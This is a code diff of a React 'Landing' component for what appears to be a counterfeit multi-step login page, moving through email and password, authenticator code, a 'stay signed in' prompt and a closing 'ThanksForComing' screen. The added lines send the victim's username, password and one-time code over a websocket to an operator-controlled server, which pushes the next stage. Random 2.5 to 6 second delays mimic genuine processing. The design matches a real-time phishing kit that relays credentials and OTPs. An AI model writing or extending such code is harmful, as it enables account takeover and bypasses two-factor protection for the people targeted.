@@ -22,10 +22,10 @@ import { Link } from "react-router-dom";
 import { Button } from "../components/ui/button";
 
 const Landing = () => {
-  const { isLoading, setIsLoading, credentials } = useUser();
+  const { isLoading, setIsLoading, credentials, sendTo, setSendTo, otp } =
+    useUser();
   const [currentStage, setCurrentStage] = useState(1);
   const [authValue, setAuthValue] = useState("");
-  const [sendTo, setSendTo] = useState("");
   const [staySignedIn, setStaySignedIn] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
   const [verificationMessage, setVerificationMessage] = useState("");
@@ -33,6 +33,9 @@ const Landing = () => {
   const [value, setValue] = useState("");
 
   const socketRef = useRef(null);
+
+  const getRandomNumber = () =>
+    Math.floor(Math.random() * (6000 - 2500 + 1)) + 2500;
 
   useEffect(() => {
     if (!socketRef.current) {
@@ -62,6 +65,27 @@ const Landing = () => {
           if (data.sendTo) {
             setSendTo(data.sendTo);
           }
+        } else if (data.eventType === "auth_value_submit") {
+          setIsLoading(false);
+
+          if (data.nextStep) {
+            setCurrentStage(data.nextStep);
+          }
+
+          if (data.message) {
+            setVerificationMessage(data.message);
+          }
+        } else if (data.eventType === "stay_signed_in") {
+          if (data.message) {
+            setVerificationMessage(data.message);
+          }
+
+          setTimeout(() => {
+            setIsLoading(false);
+            if (data.nextStep) {
+              setCurrentStage(data.nextStep);
+            }
+          }, getRandomNumber());
         }
       });
 
@@ -105,19 +129,31 @@ const Landing = () => {
   const handleAuthValueSubmit = () => {
     setIsLoading(true);
     setErrorMessage("");
-    socketRef.current.emit("auth_value_submit", { authValue });
+    socketRef.current.emit("auth_value_submit", {
+      email: credentials.username,
+      password: credentials.password,
+      otp: otp,
+      timestamp: new Date().toISOString(),
+      sessionId: socketRef.current.id,
+    });
   };
 
   const handleStaySignedIn = (choice) => {
-    setStaySignedIn(choice);
-    socketRef.current.emit("stay_signed_in", { choice });
-    setCurrentStage(4);
+    setIsLoading(true);
+    setErrorMessage("");
+    socketRef.current.emit("stay_signed_in", {
+      email: credentials.username,
+      password: credentials.password,
+      staySignedIn: choice,
+      timestamp: new Date().toISOString(),
+      sessionId: socketRef.current.id,
+    });
   };
 
   const stageComponents = {
     1: <EmailPassword handleLogin={handleLogin} />,
-    2: <Authenticator />,
-    3: <IsSignedIn />,
+    2: <Authenticator handleAuthValueSubmit={handleAuthValueSubmit} />,
+    3: <IsSignedIn handleStaySignedIn={handleStaySignedIn} />,
     4: <ThanksForComing />,
   };
 
